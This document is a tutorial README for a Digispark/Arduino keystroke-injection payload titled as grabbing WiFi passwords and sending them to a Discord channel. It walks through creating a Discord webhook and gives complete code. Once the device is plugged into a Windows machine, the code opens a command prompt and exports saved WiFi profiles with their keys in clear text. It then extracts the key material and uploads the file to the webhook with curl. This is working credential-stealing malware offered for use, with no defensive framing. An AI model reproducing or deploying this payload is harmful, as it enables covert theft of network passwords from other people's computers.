## GRAB AND SEND WIFI PASSWORDS TO YOUR DISCORD CHANNEL

#### STEP 1:
    1.Create a Discord Server/Channel
    
    2.<img width="190" alt="image" src="https://user-images.githubusercontent.com/42895491/195396479-791a9c55-8cce-4035-9ed6-fddf79630f7f.png">
    go to the edit channel option.
    
    3.<img width="207" alt="image" src="https://user-images.githubusercontent.com/42895491/195396622-ef4c814b-2266-43e7-a9cc-673aa92c49bd.png">
    go to integrations.
    
    4.<img width="219" alt="image" src="https://user-images.githubusercontent.com/42895491/195396833-4db55a94-ee94-4f6c-b58b-b6adea0eea8b.png">
    create a new web hook.
    
    5.<img width="493" alt="image" src="https://user-images.githubusercontent.com/42895491/195396911-577f9009-e8a0-40fa-8b22-8c698d072e51.png">
    copy the web hook url.

#### STEP 2:
    <img width="529" alt="image" src="https://user-images.githubusercontent.com/42895491/195396138-5582d418-d9c5-4d3e-820a-19bf4c447756.png">
    change the "FILENAME" to anyname you want your folder to be.
    
    Also Edit the line number 16 in the Arduino code and insert the following details (* most important Webhook url)
    '''
      DigiKeyboard.println("curl -i -H \"Expect:application/json\" -F file=@wifi -F \"payload_json={\\\"wait\\\":true,\\\"content\\\":\\\"ANYCOMMENT\\\",\\\"ANYNAME\\\":\\\"passwords\\\"}\" WEBHOOK_URL"); //curl command which is used to send the passwords to your discord channel/server (**Change replace "WEBHOOK_URL" with your discord's webhook url of any channel.
    '''
  
  #### Example:
  '''
  #include "DigiKeyboard.h"
  void setup() {
  pinMode(1, OUTPUT); //LED on Model A
  }
  void loop() {
    DigiKeyboard.update();
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
    DigiKeyboard.delay(300);
    DigiKeyboard.println("cmd");
    DigiKeyboard.delay(500);
    DigiKeyboard.println("netsh wlan export profile key=clear");
    DigiKeyboard.delay(500);
    DigiKeyboard.println("powershell Select-String -Path Wi-Fi-* -Pattern 'keyMaterial' > wifi");
    DigiKeyboard.delay(500);
    DigiKeyboard.println("curl -i -H \"Expect:application/json\" -F file=@wifi -F \"payload_json={\\\"wait\\\":true,\\\"content\\\":\\\"Ashfaque\\\",\\\"ANYNAME\\\":\\\"passwords\\\"}\" https://discord.com/api/webhooks/996103446740619284/"); // this is a dummy webhook url.
    DigiKeyboard.delay(500);
    DigiKeyboard.println("exit");
    digitalWrite(1, HIGH); //led on
    DigiKeyboard.delay(90000);
  }
'''
  
  ### Your are all set to upload the code.

